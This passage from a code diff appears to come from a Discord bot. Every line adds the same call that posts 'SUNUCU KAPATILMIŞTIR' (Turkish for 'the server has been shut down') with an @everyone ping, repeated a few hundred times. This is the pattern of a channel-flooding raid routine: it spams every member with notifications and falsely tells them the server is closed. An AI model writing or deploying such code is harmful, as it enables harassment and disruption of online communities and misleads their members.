+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
